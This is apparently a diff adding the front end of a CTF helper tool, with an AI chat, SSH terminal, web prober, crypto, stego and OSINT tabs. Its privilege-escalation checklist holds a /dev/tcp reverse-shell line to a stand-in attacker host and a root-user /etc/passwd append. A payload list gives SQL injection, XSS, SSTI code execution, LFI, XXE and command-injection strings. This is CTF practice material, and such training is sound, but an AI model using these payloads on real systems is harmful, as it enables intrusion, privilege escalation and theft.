+        <a href="https://hunter.io" target="_blank" class="tag tag-b" style="text-decoration:none">hunter.io</a>
+        <a href="https://github.com/search" target="_blank" class="tag tag-b" style="text-decoration:none">GitHub search</a>
+        <a href="https://pastebin.com/search" target="_blank" class="tag tag-b" style="text-decoration:none">Pastebin</a>
+        <a href="https://www.google.com/search" target="_blank" class="tag tag-b" style="text-decoration:none">Google dorks</a>
+        <a href="https://lookup.icann.org" target="_blank" class="tag tag-b" style="text-decoration:none">ICANN WHOIS</a>
+        <a href="https://dnsdumpster.com" target="_blank" class="tag tag-b" style="text-decoration:none">DNS Dumpster</a>
+        <a href="https://www.virustotal.com" target="_blank" class="tag tag-b" style="text-decoration:none">VirusTotal</a>
+        <a href="https://www.exploit-db.com" target="_blank" class="tag tag-b" style="text-decoration:none">Exploit-DB</a>
+        <a href="https://search.censys.io" target="_blank" class="tag tag-b" style="text-decoration:none">Censys</a>
+      </div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Image OSINT & reverse search</div>
+      <div style="display:flex;flex-wrap:wrap;gap:5px;margin-bottom:8px">
+        <a href="https://images.google.com" target="_blank" class="btn bg btn-sm" style="text-decoration:none">Google Images</a>
+        <a href="https://yandex.com/images" target="_blank" class="btn bg btn-sm" style="text-decoration:none">Yandex</a>
+        <a href="https://tineye.com" target="_blank" class="btn bg btn-sm" style="text-decoration:none">TinEye</a>
+      </div>
+      <div class="out" style="font-size:10px">exiftool image.jpg              # GPS coords, camera, software, author
+identify -verbose image.jpg     # ImageMagick metadata
+strings image.jpg | grep -i flag
+# GPS coords in EXIF → Google Maps
+# Landmark identification → search reverse image
+# Document metadata (PDF/DOCX): author, company, edit times</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEGO ─── -->
+<div class="tc" id="tc-stego">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">Steganography tool guide by file type</div>
+      <div class="g2">
+        <div class="col">
+          <div style="color:var(--cy);font-size:10px;margin-bottom:5px">IMAGE (.jpg .png .bmp)</div>
+          <div class="out sm" style="font-size:10px">steghide extract -sf file.jpg -p ''
+steghide extract -sf file.jpg -p password
+stegsolve file.png          # GUI color plane viewer
+zsteg file.png              # LSB, bitplanes
+zsteg -a file.png           # try all methods
+strings file.png | grep flag
+binwalk -e file.png         # embedded files
+exiftool file.png           # metadata
+convert file.png -separate channel_%d.png
+# Python LSB extract:
+from PIL import Image
+img = Image.open('file.png')
+pixels = list(img.getdata())
+bits = ''.join(str(p[0]&1) for p in pixels)
+msg = ''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))</div>
+        </div>
+        <div class="col">
+          <div style="color:var(--cy);font-size:10px;margin-bottom:5px">AUDIO (.wav .mp3)</div>
+          <div class="out sm" style="font-size:10px"># Audacity: View > Show Spectrum
+# Sonic Visualizer: Layer > Add Spectrogram
+# Flag often visible in frequency domain
+mp3stego-decode -X in.mp3 out.txt
+DeepSound (Windows GUI)
+binwalk -e audio.wav
+strings audio.wav | grep flag
+# Morse code in audio waveform?
+# DTMF tones → dtmf-decoder
+# Spectrum analysis: look for text shapes</div>
+          <div style="color:var(--cy);font-size:10px;margin:8px 0 5px">TEXT / WHITESPACE</div>
+          <div class="out sm" style="font-size:10px"># Zero-width chars: use Misc > ZWC detector
+# Whitespace stego: stegsnow
+stegsnow -C file.txt        # extract
+# Extra spaces at line ends (binary encoding)
+# Unicode lookalikes (e.g. Cyrillic 'а' vs Latin 'a')
+cat -A file.txt             # show hidden chars
+hexdump -C file.txt | grep -v "  00"</div>
+        </div>
+      </div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">LSB Python extractor (paste & customize)</div>
+      <pre class="code">from PIL import Image
+
+def lsb_extract(filename, n_bits=1, channel=0):
+    """Extract LSB steganography from image"""
+    img = Image.open(filename).convert('RGB')
+    pixels = list(img.getdata())
+    channels = ['R','G','B']
+    print(f"Extracting LSB from {channels[channel]} channel")
+    
+    bits = ''
+    for pixel in pixels:
+        for bit in range(n_bits):
+            bits += str((pixel[channel] >> bit) & 1)
+    
+    # Try to decode as text
+    result = []
+    for i in range(0, len(bits)-7, 8):
+        byte = int(bits[i:i+8], 2)
+        if byte == 0: break
+        if 32 <= byte <= 126:
+            result.append(chr(byte))
+    
+    msg = ''.join(result)
+    print(f"Decoded: {msg[:200]}")
+    
+    # Search for flag pattern
+    import re
+    flags = re.findall(r'[a-zA-Z0-9_]+\{[^}]+\}', msg)
+    if flags: print(f"🚩 FLAGS: {flags}")
+    return msg
+
+lsb_extract('challenge.png')</pre>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Spectrogram flag (audio)</div>
+      <pre class="code">import numpy as np
+import scipy.io.wavfile as wav
+import matplotlib.pyplot as plt
+
+rate, data = wav.read('challenge.wav')
+if len(data.shape) > 1:
+    data = data[:,0]  # mono
+
+# High-res spectrogram to reveal hidden text
+plt.figure(figsize=(20, 8))
+plt.specgram(data, Fs=rate, NFFT=2048, noverlap=1800, cmap='hot')
+plt.title('Spectrogram — look for text/flag shapes')
+plt.xlabel('Time (s)')
+plt.ylabel('Frequency (Hz)')
+plt.colorbar()
+plt.savefig('spectrogram.png', dpi=200)
+plt.show()
+print("Saved spectrogram.png")</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ─── NETWORK ─── -->
+<div class="tc" id="tc-net">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">Port scanner</div>
+      <div class="row" style="margin-bottom:7px">
+        <input class="fi" id="psHost" placeholder="target.com" style="flex:1">
+        <input class="fi" id="psPorts" value="21,22,23,25,53,80,443,8080,8443,3306,5432,6379,27017,9200" style="flex:2">
+        <button class="btn bc" onclick="doScan()">scan</button>
+      </div>
+      <div id="scanRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Banner grabber</div>
+      <div class="row" style="margin-bottom:7px">
+        <input class="fi" id="bgHost" placeholder="host" style="flex:1">
+        <input class="fi" id="bgPort" placeholder="port" style="width:70px">
+        <button class="btn bc" onclick="doBanner()">grab</button>
+      </div>
+      <div id="bannerRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Linux privilege escalation checklist</div>
+      <div class="out" style="max-height:260px;font-size:10px"># 1. Sudo
+sudo -l
+sudo -u root /bin/bash
+
+# 2. SUID binaries (check GTFOBins)
+find / -perm -4000 2>/dev/null
+# then: https://gtfobins.github.io/
+
+# 3. Writable cron
+cat /etc/crontab
+ls -la /etc/cron.d/
+# if a script is world-writable: echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> script.sh
+
+# 4. Capabilities
+getcap -r / 2>/dev/null
+# python3 cap_setuid+eip: python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+
+# 5. Writable /etc/passwd
+echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
+su pwned
+
+# 6. Path hijacking
+export PATH=/tmp:$PATH
+echo '#!/bin/bash\n/bin/bash' > /tmp/ls; chmod +x /tmp/ls
+
+# 7. Environment variables (LD_PRELOAD, LD_LIBRARY_PATH)
+# 8. NFS no_root_squash
+# 9. Docker group: docker run -v /:/mnt alpine chroot /mnt sh
+# 10. Kernel exploits: uname -a → search CVE</div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Common CTF network services</div>
+      <div class="out" style="font-size:10px;max-height:180px"># FTP anonymous login:
+ftp target.com → user: anonymous / pass: anything
+ncftp -u anonymous target.com
+
+# SMB enumeration:
+smbclient -L //target.com -N
+smbclient //target.com/share -N
+enum4linux target.com
+
+# SMTP enumeration:
+nc target.com 25
+VRFY admin
+EXPN admin
+
+# DNS zone transfer:
+dig axfr @nameserver domain.com
+host -l domain.com nameserver
+
+# Redis (if port 6379 open):
+redis-cli -h target.com
+> KEYS * → GET <key>
+
+# MongoDB (if 27017 open):
+mongo target.com:27017 --eval "db.adminCommand({listDatabases:1})"</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── MISC ─── -->
+<div class="tc" id="tc-misc">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">Encoding identifier</div>
+      <div class="row" style="margin-bottom:7px"><textarea class="fi" id="miscIn" style="flex:1;min-height:50px" placeholder="paste mystery text..."></textarea><button class="btn bc" onclick="doMisc()">identify</button></div>
+      <div id="miscRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Zero-width character detector</div>
+      <div class="row" style="margin-bottom:7px"><textarea class="fi" id="zwcIn" style="flex:1;min-height:50px" placeholder="paste text that might contain zero-width chars..."></textarea><button class="btn bc" onclick="doZWC()">detect & decode</button></div>
+      <div id="zwcRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Cipher reference card</div>
+      <div class="g2">
+        <div class="out sm" style="font-size:10px">MORSE: . = E, - = T, .- = A, -... = B
+BRAILLE: ⠁=A ⠃=B ⠉=C ⠙=D ⠑=E ⠋=F
+NATO: Alpha Bravo Charlie Delta Echo
+SEMAPHORE: flag positions = letters
+BACON: each letter = 5 A/B combos
+POLYBIUS: 5x5 grid, coords = letters
+ATBASH: A↔Z B↔Y reverse alphabet
+ROT47: includes numbers+symbols (!-~)
+PHONE (T9): 2=ABC 3=DEF 4=GHI 5=JKL
+KEYBOARD SHIFT: QWERTY shift by 1 key</div>
+        <div class="out sm" style="font-size:10px">BRAINFUCK: +.-[]<> characters only
+OOK!: Ook. Ook? Ook! combos
+WHITESPACE: only spaces/tabs/newlines
+PIET: colored images as programs
+COW: moo MOo MoO... variants
+JSFUCK: []()!+ only valid JavaScript
+MALBOLGE: intentionally obscure
+# Online decoders:
+# dcode.fr — biggest cipher database
+# CyberChef — chain transforms
+# gchq.github.io/CyberChef</div>
+      </div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Logic puzzle & number theory helpers</div>
+      <pre class="code"># Check if number is prime
+from sympy import isprime, factorint, nextprime
+n = 123456789
+print(isprime(n))
+print(factorint(n))  # factorization
+
+# Find pattern in sequence
+seq = [1, 1, 2, 3, 5, 8, 13]  # Fibonacci?
+diffs = [seq[i+1]-seq[i] for i in range(len(seq)-1)]
+print("Differences:", diffs)
+
+# Modular arithmetic
+from sympy import mod_inverse
+print(mod_inverse(7, 26))  # 7^-1 mod 26
+
+# Convert: decimal, hex, binary, octal
+n = 65  # 'A'
+print(f"dec={n} hex={hex(n)} bin={bin(n)} oct={oct(n)} chr={chr(n)}")
+
+# All base conversions
+for base, fn in [(2,bin),(8,oct),(16,hex)]:
+    print(f"base {base}: {fn(n)}")
+
+# CRC32
+import zlib
+print(hex(zlib.crc32(b'hello')))
+
+# Hash
+import hashlib
+print(hashlib.md5(b'hello').hexdigest())
+print(hashlib.sha256(b'hello').hexdigest())</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ─── SCRIPTS ─── -->
+<div class="tc" id="tc-scripts">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">Ready-to-use exploit scripts — click to copy</div>
+      <div id="scriptsArea"></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /panel -->
+</div><!-- /main -->
+
+<script>
+const API = 'http://localhost:5000/api';
+let cat = 'auto', history = [], sshSid = null, termBuf = '', lastProbe = null, lastReq = null;
+
+// ── detect available providers on load ─────────────────────────────
+(async function initProviders(){
+  try{
+    const r=await fetch(API+'/providers');
+    const d=await r.json();
+    const sel=document.getElementById('aiProvider');
+    if(d.providers && d.providers.length){
+      // disable options that don't have keys configured
+      for(const opt of sel.options){
+        if(!d.providers.includes(opt.value)) opt.disabled=true;
+      }
+      // auto-select first available
+      sel.value=d.providers[0];
+    }
+  }catch(e){console.warn('Could not fetch providers',e);}
+})();
+
+// ── tabs ──────────────────────────────────────────────────────────
+const TABS = ['chat','ssh','web','crypto','forensics','osint','stego','net','misc','scripts'];
+function sw(name) {
+  const bars = document.querySelectorAll('.tab');
+  TABS.forEach((t,i) => bars[i].classList.toggle('on', t===name));
+  TABS.forEach(t => document.getElementById('tc-'+t).classList.toggle('on', t===name));
+  if (name === 'scripts') loadScripts();
+}
+function setCat(btn, c) {
+  document.querySelectorAll('.sb-btn').forEach(b=>b.classList.remove('on'));
+  btn.classList.add('on'); cat = c;
+}
+function inj(text) { sw('chat'); const ta=document.getElementById('chatTa'); ta.value=text; ta.focus(); }
+
+// ── chat ──────────────────────────────────────────────────────────
+function ck(e) { if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();doChat();} }
+function addMsg(role, text) {
+  const box = document.getElementById('chatBox');
+  const d = document.createElement('div');
+  d.className = 'msg'+(role==='me'?' me':'');
+  d.innerHTML = `<div class="msg-h"><span class="bdg ${role==='me'?'bme':'bai'}">${role==='me'?'YOU':'CTF-AI'}</span></div><div class="bubble">${fmt(text)}</div>`;
+  box.appendChild(d); box.scrollTop = box.scrollHeight;
+}
+function fmt(t) {
+  t = t.replace(/```[\w]*\n?([\s\S]*?)```/g,'<pre class="code">$1</pre>');
+  t = t.replace(/`([^`\n]+)`/g,'<code style="background:#111;padding:1px 4px;border-radius:3px">$1</code>');
+  t = t.replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>');
+  t = t.replace(/(?:🚩\s*FLAG[:\s]*|(?<!\w))([a-zA-Z0-9_]{2,10}\{[^}]{3,80}\})/g,'<div class="flag-hit">🚩 FLAG: $1</div>');
+  return t.replace(/\n/g,'<br>');
+}
+function addTyp() {
+  const box = document.getElementById('chatBox');
+  const d = document.createElement('div'); d.id='typ'; d.className='msg';
+  d.innerHTML='<div class="msg-h"><span class="bdg bai">CTF-AI</span></div><div class="bubble"><div class="tp"><span></span><span></span><span></span></div></div>';
+  box.appendChild(d); box.scrollTop=box.scrollHeight;
+}
+async function doChat() {
+  const ta=document.getElementById('chatTa'), text=ta.value.trim();
+  if(!text)return; ta.value=''; document.getElementById('sendBtn').disabled=true;
+  addMsg('me',text); history.push({role:'user',content:text}); addTyp();
+  try {
+    const provider = document.getElementById('aiProvider').value;
+    const r = await fetch(API+'/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messages:history,category:cat,provider})});
+    const d = await r.json();
+    document.getElementById('typ')?.remove();
+    const reply = d.reply||d.error||'No response';
+    addMsg('ai',reply); history.push({role:'assistant',content:reply});
+    if(history.length>30) history=history.slice(-30);
+  } catch(e) {
+    document.getElementById('typ')?.remove();
+    addMsg('ai','❌ Server error: '+e.message+'\n\nIs Flask running? → python app.py');
+  }
+  document.getElementById('sendBtn').disabled=false;
+}
+
+// ── SSH ───────────────────────────────────────────────────────────
+async function sConn() {
+  const host=gv('sH'),port=gv('sP'),user=gv('sU'),pw=gv('sPw');
+  if(!host||!pw){alert('Enter host+password');return;}
+  st('ssSt','● connecting...','var(--a)');
+  try {
+    const r=await post('/ssh/connect',{host,port,user,password:pw});
+    if(r.ok){sshSid=r.sid;st('ssSt','● '+host,'var(--g)');tWrite('// connected\n'+r.output+'\n');}
+    else st('ssSt','● '+r.error,'var(--r)');
+  } catch(e){st('ssSt','● '+e.message,'var(--r)');}
+}
+async function sDisc() {
+  if(sshSid) await post('/ssh/disconnect',{sid:sshSid});
+  sshSid=null; st('ssSt','● disconnected','var(--t3)'); tWrite('\n// disconnected\n');
+}
+async function rc(cmd) {
+  document.getElementById('tCmd').value='';
+  if(!cmd)return;
+  if(!sshSid){tWrite('// not connected\n');return;}
+  tWrite('\n$ '+cmd+'\n');
+  try {
+    const r=await post('/ssh/run',{sid:sshSid,cmd});
+    if(r.output)tWrite(r.output);
+    if(r.error)tWrite('STDERR: '+r.error);
+  } catch(e){tWrite('Error: '+e.message);}
+}
+function tWrite(txt) {
+  const el=document.getElementById('tOut');
+  el.textContent+=txt; el.scrollTop=el.scrollHeight; termBuf+=txt;
+}
+function ssAI() {
+  if(!termBuf)return;
+  inj('SSH output from CTF server — analyze for vulnerabilities, privesc paths, or flags:\n\n'+termBuf.slice(-3000));
+}
+
+// ── WEB ───────────────────────────────────────────────────────────
+async function probe() {
+  const url=gv('pUrl'); if(!url)return;
+  const el=document.getElementById('pRes');
+  el.innerHTML='<span style="color:var(--t3)">scanning...</span>';
+  try {
+    const d=await post('/web/probe',{url}); lastProbe=d;
+    let h='';
+    if(d.error){h=`<span style="color:var(--r)">${d.error}</span>`;}
+    else {
+      h+=`<table class="kv">
+        <tr><td>status</td><td><span class="status s${Math.floor((d.status||0)/100)*100}">${d.status}</span></td></tr>
+        <tr><td>final url</td><td>${d.url_final||''}</td></tr>
+        <tr><td>body length</td><td>${d.body_len||0} chars</td></tr>`;
+      if(d.interesting_headers) for(const[k,v] of Object.entries(d.interesting_headers)) h+=`<tr><td>${k}</td><td style="color:var(--a)">${v}</td></tr>`;
+      if(d.cookies&&Object.keys(d.cookies).length) h+=`<tr><td>cookies</td><td>${JSON.stringify(d.cookies)}</td></tr>`;
+      h+='</table>';
+      if(d.flags?.length){h+='<div style="margin-top:8px"><div class="sec-t" style="color:var(--g)">🚩 FLAGS FOUND!</div>';d.flags.forEach(f=>h+=`<span class="tag tag-g">${f}</span>`);h+='</div>';}
+      if(d.html_comments?.length){h+='<div style="margin-top:8px"><div class="sec-t">HTML comments</div>';d.html_comments.forEach(c=>h+=`<div class="tag tag-a" style="display:block;margin:2px">${esc(c)}</div>`);h+='</div>';}
+      if(d.found_paths?.length){
+        h+='<div style="margin-top:8px"><div class="sec-t">Interesting paths found</div>';
+        d.found_paths.forEach(p=>h+=`<div style="margin:3px 0"><span class="tag tag-c">${p.status}</span> <span style="color:var(--g)">${p.path}</span> <span style="color:var(--t2);font-size:10px">${esc(p.preview.slice(0,80))}</span></div>`);
+        h+='</div>';
+      }
+      if(d.links?.length){h+='<div style="margin-top:8px"><div class="sec-t">Links</div><div style="max-height:100px;overflow-y:auto">';d.links.slice(0,20).forEach(l=>h+=`<span class="tag tag-b">${esc(l)}</span>`);h+='</div></div>';}
+      h+=`<div style="margin-top:8px"><div class="sec-t">Body preview</div><pre class="code">${esc(d.body?.slice(0,2000)||'')}</pre></div>`;
+    }
+    el.innerHTML=h;
+  } catch(e){el.innerHTML=`<span style="color:var(--r)">Error: ${e.message}</span>`;}
+}
+function pAI() {
+  if(!lastProbe)return;
+  inj('Web CTF probe results — find attack vectors and flag:\n\n'+JSON.stringify(lastProbe,null,2).slice(0,3000));
+}
+async function doReq() {
+  const url=gv('rUrl'),method=gv('rMeth'),body=gv('rBody');
+  let headers={};try{headers=JSON.parse(gv('rHdr')||'{}');}catch(e){}
+  if(!url)return;
+  try {
+    const d=await post('/web/request',{url,method,headers,body}); lastReq=d;
+    let h=`<table class="kv"><tr><td>status</td><td><span class="status s${Math.floor((d.status||0)/100)*100}">${d.status}</span></td></tr></table>`;
+    if(d.flags?.length){h+='<div style="margin-top:6px">';d.flags.forEach(f=>h+=`<span class="tag tag-g">🚩 ${f}</span>`);h+='</div>';}
+    h+=`<pre class="code" style="margin-top:8px">${esc(d.body||d.error||'')}</pre>`;
+    document.getElementById('rRes').innerHTML=h;
+  } catch(e){document.getElementById('rRes').innerHTML=`<span style="color:var(--r)">${e.message}</span>`;}
+}
+function rAI() {
+  if(!lastReq) return;
+  inj('HTTP response from CTF challenge — find vulnerability and flag:\n\n'+JSON.stringify(lastReq,null,2).slice(0,3000));
+}
+const PAYLOADS = {
+  sqli: ["' OR '1'='1","' OR 1=1--","admin'--","' UNION SELECT NULL,NULL,NULL--","' AND SLEEP(5)--","' AND 1=BENCHMARK(5000000,MD5(1))--"],
+  xss: ['<scr'+'ipt>alert(1)<\/scr'+'ipt>','"><img src=x onerror=alert(1)>',"';alert(document.cookie)//","<svg/onload=alert(1)>",'javascript:alert(1)'],
+  ssti: ['{{7*7}}','${7*7}','<%= 7*7 %>','{{config}}','{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}','{{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag").read()}}'],
+  lfi: ['../etc/passwd','../../etc/passwd','../../../etc/passwd','php://filter/convert.base64-encode/resource=index.php','/proc/self/environ','/flag','/home/ctf/flag.txt'],
+  xxe: ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>','<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]><root>&xxe;</root>'],
+  cmd: ['; cat /flag','| cat /flag','`cat /flag`','$(cat /flag)','; ls -la /; cat /flag.txt','; id; whoami'],
+  jwt_none: ['{"alg":"none"}','{"alg":"None"}','{"alg":"NONE"}','{"alg":"nOnE"}'],
+};
+function setPayload(type) {
+  const p = PAYLOADS[type]; if(!p)return;
+  document.getElementById('rBody').value = p.join('\n');
+}
+async function analyzeJWT() {
+  const token=gv('jwtIn').trim(); if(!token)return;
+  try {
+    const d=await post('/web/jwt',{token});
+    if(d.error){document.getElementById('jwtRes').innerHTML=`<span style="color:var(--r)">${d.error}</span>`;return;}
+    let h=`<table class="kv">
+      <tr><td>algorithm</td><td style="color:var(--a)">${d.algorithm}</td></tr>
+      <tr><td>header</td><td><pre class="code">${JSON.stringify(d.header,null,2)}</pre></td></tr>
+      <tr><td>payload</td><td><pre class="code">${JSON.stringify(d.payload,null,2)}</pre></td></tr>
+    </table><div style="margin-top:8px"><div class="sec-t">Attacks</div>`;
+    d.attacks.forEach(a=>{
+      h+=`<div style="margin-bottom:6px"><span class="tag tag-a">${a.name}</span>`;
+      if(a.cmd) h+=`<pre class="code">${esc(a.cmd)}</pre>`;
+      if(a.code) h+=`<pre class="code">${esc(a.code)}</pre>`;
+      if(a.token) h+=`<div style="font-size:10px;color:var(--cy);word-break:break-all;margin-top:3px">${esc(a.token)}</div>`;
+      h+='</div>';
+    });
+    h+='</div>';
+    document.getElementById('jwtRes').innerHTML=h;
+  } catch(e){document.getElementById('jwtRes').innerHTML=`<span style="color:var(--r)">${e.message}</span>`;}
+}
+async function doSQLi() {
+  const d=await post('/web/sqli',{target:gv('sqliUrl'),param:gv('sqliParam'),db:gv('sqliDb')});
+  let h='<div class="sec-t">Payloads</div>';
+  for(const[cat,pls] of Object.entries(d.payloads)){
+    h+=`<div style="margin-bottom:6px"><span class="tag tag-a">${cat}</span><ul class="plist">`;
+    pls.forEach(p=>h+=`<li onclick="copyText(this.textContent)">${esc(p)}</li>`);
+    h+='</ul></div>';
+  }
+  if(d.script) h+=`<div class="sec-t" style="margin-top:8px">Auto exploit script</div><pre class="code">${esc(d.script)}</pre>`;
+  document.getElementById('sqliRes').innerHTML=h;
+}
+async function doLFI() {
+  const d=await post('/web/lfi',{param:gv('lfiParam')});
+  let h='<ul class="plist">';
+  d.payloads.forEach(p=>h+=`<li onclick="copyText(this.textContent)">${esc(p)}</li>`);
+  h+='</ul><div style="margin-top:6px;font-size:10px;color:var(--t3)">'+esc(d.note)+'</div>';
+  document.getElementById('lfiRes').innerHTML=h;
+}
+
+// ── CRYPTO ───────────────────────────────────────────────────────
+function showExtra() {
+  const m=gv('decMode');
+  document.getElementById('decExtra').placeholder = m==='xor'||m==='xor_hex'?'key (e.g. 42)':m==='caesar'?'shift (1-25)':m==='vigenere'?'key word':m==='railfence'?'rails (2-5)':'key/shift';
+}
+async function doDecode() {
+  const d=await post('/decode',{mode:gv('decMode'),text:gv('decIn'),key:gv('decExtra'),shift:gv('decExtra')});
+  document.getElementById('decOut').textContent=d.result+(d.flags?.length?'\n\n🚩 '+d.flags.join(', '):'');
+}
+function decAI() { inj('I decoded this and got:\n\n'+document.getElementById('decOut').textContent+'\n\nWhat is the flag?'); }
+async function doRSA() {
+  const d=await post('/crypto/rsa',{n:gv('rsaN'),e:gv('rsaE'),c:gv('rsaC'),p:gv('rsaP'),q:gv('rsaQ')});
+  let h='';
+  if(d.flag) h+=`<div class="flag-hit" style="margin-bottom:8px">🚩 FLAG: ${esc(d.flag)}</div>`;
+  if(d.info) h+=`<table class="kv">${Object.entries(d.info).map(([k,v])=>`<tr><td>${k}</td><td>${esc(String(v).slice(0,100))}</td></tr>`).join('')}</table>`;
+  if(d.attacks){
+    h+='<div style="margin-top:8px"><div class="sec-t">Attacks</div>';
+    d.attacks.forEach(a=>{
+      h+=`<div style="margin-bottom:6px"><span class="tag tag-a">${a.name}</span>`;
+      if(a.url) h+=`<a href="${a.url}" target="_blank" class="tag tag-b" style="text-decoration:none">open factordb</a>`;
+      if(a.cmd) h+=`<pre class="code">${esc(a.cmd)}</pre>`;
+      h+='</div>';
+    });
+  }
+  if(d.script) h+=`<div class="sec-t">Script</div><pre class="code">${esc(d.script)}</pre>`;
+  if(d.error) h+=`<span style="color:var(--r)">${d.error}</span>`;
+  document.getElementById('rsaRes').innerHTML=h;
+}
+function rsaAI() {
+  inj(`RSA challenge — analyze and find the flag:\nn = ${gv('rsaN')}\ne = ${gv('rsaE')}\nc = ${gv('rsaC')}\nWrite a complete Python solution.`);
+}
+async function doXor() {
+  const d=await post('/xor/brute',{hex:gv('xorIn')});
+  if(d.error){document.getElementById('xorOut').textContent=d.error;return;}
+  let text=''; const results=d.results||[];
+  results.forEach(r=>{
+    const mark = r.is_flag?'  ← 🚩 FLAG':'';
+    text+=`key=0x${r.hex_key.padEnd(4)} (${r.key}) [${r.printable_pct}% printable]${mark}\n${r.text.slice(0,120)}\n\n`;
+  });
+  document.getElementById('xorOut').textContent=text||'No printable results (check if input is hex)';
+}
+async function doHash() {
+  const d=await post('/hash/identify',{hash:gv('hashIn')});
+  let h=`<table class="kv"><tr><td>length</td><td>${d.length}</td></tr><tr><td>types</td><td>${d.types.map(t=>`<span class="tag tag-a">${t}</span>`).join(' ')}</td></tr></table>`;
+  h+=`<pre class="code" style="margin-top:6px">${esc(d.hashcat)}\n${esc(d.john)}</pre>`;
+  h+='<div style="margin-top:5px">';d.online?.forEach(url=>h+=`<a href="${url}" target="_blank" class="tag tag-b" style="text-decoration:none">${url.split('/')[2]}</a>`);h+='</div>';
+  document.getElementById('hashRes').innerHTML=h;
+}
+function doFreq() {
+  const text=gv('freqIn'); if(!text)return;
+  const freq={};
+  for(const c of text.toLowerCase()) if(/[a-z]/.test(c)) freq[c]=(freq[c]||0)+1;
+  const sorted=Object.entries(freq).sort((a,b)=>b[1]-a[1]);
+  const total=sorted.reduce((s,[,v])=>s+v,0);
+  const eng='etaoinshrdlcumwfgypbvkjxqz';
+  let out='Letter frequencies (for substitution cipher cracking):\n\n';
+  sorted.forEach(([c,n],i)=>{
+    const bar='█'.repeat(Math.round(n/total*30));
+    out+=`${c.toUpperCase()} ${(n/total*100).toFixed(1).padStart(4)}% ${bar} → likely '${(eng[i]||'?').toUpperCase()}'\n`;
+  });
+  out+='\n→ Use allrot in decoder if it\'s Caesar\n→ Paste into AI with "frequency analysis → find substitution cipher key"';
+  document.getElementById('freqOut').textContent=out;
+}
+
+// ── FORENSICS ─────────────────────────────────────────────────────
+async function doForensics() {
+  const fn=gv('fName'), content=gv('fContent');
+  let content_b64='';
+  if(content){
+    try{content_b64=btoa(content);}
+    catch(e){content_b64=btoa(unescape(encodeURIComponent(content)));}
+  }
+  const d=await post('/forensics/analyze',{filename:fn,content_b64});
+  let h=`<table class="kv"><tr><td>detected type</td><td style="color:var(--cy)">${d.type||'unknown'}</td></tr></table>`;
+  if(d.magic_bytes) h+=`<div style="margin-top:5px"><span class="tag tag-a">Magic bytes: ${d.magic_bytes}</span></div>`;
+  if(d.flags_in_header?.length) h+=`<div class="flag-hit">🚩 ${d.flags_in_header.join(', ')}</div>`;
+  if(d.tools?.length){h+='<div style="margin-top:7px"><div class="sec-t">Tools to use</div>';d.tools.forEach(t=>h+=`<span class="tag tag-c">${t}</span>`);h+='</div>';}
+  if(d.commands?.length){h+='<div style="margin-top:7px"><div class="sec-t">Commands</div><ul class="plist">';d.commands.forEach(c=>h+=`<li onclick="copyText(this.textContent)">${esc(c)}</li>`);h+='</ul></div>';}
+  if(d.notes?.length){h+='<div style="margin-top:7px">';d.notes.forEach(n=>h+=`<div style="font-size:10px;color:var(--t2);margin-bottom:2px">• ${n}</div>`);h+='</div>';}
+  document.getElementById('fRes').innerHTML=h;
+}
+function fAI() { inj('Forensics/stego challenge — file: '+gv('fName')+'\nAnalyze and find the flag. What tools and techniques should I use?'); }
+
+// ── OSINT ─────────────────────────────────────────────────────────
+async function doDNS() {
+  const d=await post('/osint/dns',{domain:gv('dnsD')});
+  let h='<table class="kv">';
+  for(const[k,v] of Object.entries(d)){
+    if(k.endsWith('_url')||k==='ZONE_TRANSFER') continue;
+    if(Array.isArray(v)&&v.length) h+=`<tr><td>${k}</td><td>${v.map(x=>esc(x)).join('<br>')}</td></tr>`;
+    else if(typeof v==='string') h+=`<tr><td>${k}</td><td>${esc(v)}</td></tr>`;
+  }
+  h+='</table>';
+  h+=`<div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:5px">`;
+  ['crt_sh_url','shodan_url','wayback_url'].forEach(k=>{ if(d[k]) h+=`<a href="${d[k]}" target="_blank" class="tag tag-b" style="text-decoration:none">${k.replace('_url','').replace('_',' ')}</a>`; });
+  h+='</div>';
+  if(d.ZONE_TRANSFER?.length) h+=`<div class="flag-hit">Zone transfer success! Records: ${d.ZONE_TRANSFER.join(', ')}</div>`;
+  document.getElementById('dnsRes').innerHTML=h;
+}
+async function doDorks() {
+  const d=await post('/osint/dorks',{target:gv('dorkT')});
+  let h='<ul class="plist">';
+  d.dorks.forEach(dk=>h+=`<li onclick="window.open('https://www.google.com/search?q='+encodeURIComponent(this.textContent),'_blank')">${esc(dk)}</li>`);
+  h+='</ul><div style="margin-top:6px;font-size:10px;color:var(--t3)">click a dork to search Google</div>';
+  document.getElementById('dorkRes').innerHTML=h;
+}
+
+// ── NET ───────────────────────────────────────────────────────────
+async function doScan() {
+  const el=document.getElementById('scanRes');
+  el.innerHTML='<span style="color:var(--t3)">scanning (may take a moment)...</span>';
